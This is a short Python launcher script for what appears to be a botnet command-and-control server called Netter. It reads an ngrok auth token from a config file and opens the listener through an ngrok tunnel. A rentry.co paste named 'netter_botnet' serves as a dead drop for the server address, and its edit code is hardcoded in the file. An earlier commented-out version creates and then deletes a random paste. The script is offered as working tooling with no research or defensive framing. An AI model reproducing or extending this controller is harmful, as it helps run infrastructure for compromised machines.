from core.rentry import Rentry
from core.http import NetterServer
from pyngrok import ngrok
from secrets import token_urlsafe
from loguru import logger

import json


# def main():
#     ngrokConfig = ngrok.PyngrokConfig(auth_token=json.load(open("config.json"))["ngrokAuthToken"])
#     netterServer: NetterServer = NetterServer(ngrokConfig=ngrokConfig)

#     # Create a new Rentry url with the same edit code as the url name
#     url: str = Rentry.new((uname := token_urlsafe(16)), text="blank", edit_code=uname)
#     netterServer.console_log("Rentry server url created with url name " + uname)

#     netterServer.rentryUrlName = uname  # Connect to your newly created rentry server
#     netterServer.rentryEditCode = uname
#     netterServer.startNgrokTunnel(useRentry=True)
#     netterServer.listen()

#     Rentry.delete(uname, uname)


def main():
    ngrokConfig = ngrok.PyngrokConfig(auth_token=json.load(open("config.json"))["ngrokAuthToken"])

    netterServer: NetterServer = NetterServer(ngrokConfig=ngrokConfig)

    netterServer.rentryUrlName = "netter_botnet"
    netterServer.rentryEditCode = "924450817Gg"

    # netterServer.startNgrokTunnel(useRentry=True)
    netterServer.listen()


if __name__ == "__main__":
    main()
